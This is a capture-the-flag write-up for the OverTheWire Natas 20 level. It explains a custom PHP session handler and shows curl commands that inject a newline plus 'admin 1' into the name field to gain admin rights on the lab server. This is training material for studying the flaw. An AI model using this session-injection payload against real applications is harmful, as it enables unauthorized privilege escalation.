# Natas 20 -> 21

```
http://natas20.natas.labs.overthewire.org
```

```
Username: natas20
```

This time we get a message telling us that we're logged as regular user, to login as admin to get the creds. Also the source code.


```php
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) { 
    //debug("MYOPEN $path $name"); 
    return true; 
}

/* we don't need this */
function myclose() { 
    //debug("MYCLOSE"); 
    return true; 
}

function myread($sid) { 
    debug("MYREAD $sid"); 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) { 
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data"); 
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid"); 
    return true; 
}
/* we don't need this */
function mygarbage($t) { 
    //debug("MYGARBAGE $t"); 
    return true; 
}

session_set_save_handler(
    "myopen", 
    "myclose", 
    "myread", 
    "mywrite", 
    "mydestroy", 
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>

<form action="index.php" method="POST">
Your name: <input name="name" value="<?=$name?>"><br>
<input type="submit" value="Change name" />
</form> 
```

There's a line in `myread` that gives us a huge hint about how the `PHPSESSID` is formatted:

```php
if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
```

`strspn` will find the length of the initial segment of the first parameter that matches characters from the second parameter. In other words:

```
strspn("123", "1234567890abcdef") // returns int(3)
strspn("12", "1234567890abcdef") // returns int(2)
strspn("1", "1234567890abcdef") // returns int(1)
strspn("a", "1234567890abcdef") // returns int(0)
```

So, the length (`strlen`) of `PHPSESSID` must match the length of chars matched by `strspn`.  
Also, the alphabet is not in the usual order but `qwertyu.....`.  
Another thing, is worth noting that it will save the session in a file which we can discover by passing `$_GET['debug']`. This is important since the filename is named `mysess_${PHPSESSID}`.  
Let's continue, there's `session_set_save_handler` which will do the job of storing the session by calling `myread`, `mywrite` and the rest which only return `true`.  
Since `myread` will *read* the session file written by `mywrite`, let's see what it does.

```php
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
```

So, anything we pass will be written right?


```
$ curl -v --user natas20:${NATAS20_PASSWD} "http://natas20.natas.labs.overthewire.org/index.php?name=hello%20world&debug=1"

DEBUG: MYREAD bmsaqpjdmskgkdh29a47lujb15<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to hello world<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
...
DEBUG: MYWRITE bmsaqpjdmskgkdh29a47lujb15 name|s:11:"hello world";<br>DEBUG: Saving in /var/lib/php5/mysess_bmsaqpjdmskgkdh29a47lujb15<br>DEBUG: name => hello world<br>
```

Well, seems like it wrote `name => hello world` into `/var/lib/php5/mysess_bmsaqpjdmskgkdh29a47lujb15`  
Let's see the actual content.

```
$ curl -v --user natas20:${NATAS20_PASSWD} --cookie "PHPSESSID=bmsaqpjdmskgkdh29a47lujb15" "http://natas20.natas.labs.overthewire.org/index.php?name=hello%20world&debug=1"

DEBUG: MYREAD bmsaqpjdmskgkdh29a47lujb15<br>DEBUG: Reading from /var/lib/php5/mysess_bmsaqpjdmskgkdh29a47lujb15<br>DEBUG: Read [name hello world]<br>DEBUG: Read []<br>DEBUG: Name set to hello world<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
...
DEBUG: MYWRITE bmsaqpjdmskgkdh29a47lujb15 name|s:11:"hello world";<br>DEBUG: Saving in /var/lib/php5/mysess_bmsaqpjdmskgkdh29a47lujb15<br>DEBUG: name => hello world<br>
```

Yeah, it's there: `DEBUG: Read [name hello world]`  
Since the string saved is `$data .= "$key $value\n"`, can we add `\nadmin`?  
Let's URIencode the string with `firebug` or `dev-tools`:

```javascript
window.encodeURIComponent("\n") 
"%0A"
```

Let's see

```
$ curl -v --user natas20:${NATAS20_PASSWD} "http://natas20.natas.labs.overthewire.org/index.php?name=hello%0Aadmin%201&debug=1"
DEBUG: MYREAD fg004ej7l7usv4923ckslo7td5<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to hello
admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
...
DEBUG: MYWRITE fg004ej7l7usv4923ckslo7td5 name|s:13:"hello
admin 1";<br>DEBUG: Saving in /var/lib/php5/mysess_fg004ej7l7usv4923ckslo7td5<br>DEBUG: name => hello
admin 1<br>
```

And now we pass the `PHPSESSID`

```
$ curl -v --user natas20:${NATAS20_PASSWD} --cookie "PHPSESSID=fg004ej7l7usv4923ckslo7td5" "http://natas20.natas.labs.overthewire.org/index.php?name=hello%0Aadmin%201&debug=1"
DEBUG: MYREAD fg004ej7l7usv4923ckslo7td5<br>DEBUG: Reading from /var/lib/php5/mysess_fg004ej7l7usv4923ckslo7td5<br>DEBUG: Read [name hello]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to hello
admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: {...}</pre>
...
DEBUG: MYWRITE fg004ej7l7usv4923ckslo7td5 name|s:13:"hello
admin 1";admin|s:1:"1";<br>DEBUG: Saving in /var/lib/php5/mysess_fg004ej7l7usv4923ckslo7td5<br>DEBUG: admin => 1<br>DEBUG: name => hello
admin 1<br>
```

:-)


* php
* strspn
* strlen
* session_set_save_handler
